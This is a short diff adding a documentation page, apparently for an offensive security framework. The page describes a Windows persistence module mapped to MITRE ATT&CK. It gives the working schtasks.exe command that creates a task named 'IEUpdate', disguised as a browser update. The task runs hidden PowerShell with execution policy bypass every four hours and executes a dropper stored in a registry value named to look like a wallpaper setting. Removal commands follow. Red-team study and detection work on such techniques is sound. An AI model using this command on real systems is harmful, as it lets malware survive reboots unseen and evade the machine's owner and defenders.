@@ -1,0 +1,38 @@
+###################
+  Scheduled Task
+###################
+Mitre ATT&CK - `Scheduled Task <https://attack.mitre.org/wiki/Technique/T1060>`_
+
+**Requires: Normal User**
+
+This persistence mechanism uses "schtasks.exe" to create a new Scheduled Task called "IEUpdate" that runs every four hours. This will call "Powershell.exe" to obtain the dropper from a dedicated registry key.  
+
+*************************
+Install-Persistence 2
+*************************
+To add this persistence use the following command::
+
+	Install-Persistence 2
+
+Adds one registry key to store the dropper::
+
+	Wallpaper555 - HKCU\Software\Microsoft\Windows\currentversion\themes\
+ 
+Calls schtasks.exe to create a new Scheduled Task called "IEUpdate" that runs every 4 hours::
+
+	schtasks.exe /create /sc minute /mo 240 /tn "IEUpdate" /tr "powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper555"
+
+*************************
+Remove-Persistence 2
+*************************
+To remove this persistence use the following command::
+
+	Remove-Persistence 2
+
+Removes registry key with validation of removal::
+
+	Wallpaper555 - HKCU\Software\Microsoft\Windows\currentversion\themes\
+
+Runs schtasks.exe to delete the scheduled task::
+
+	schtasks.exe /delete /tn IEUpdate /F
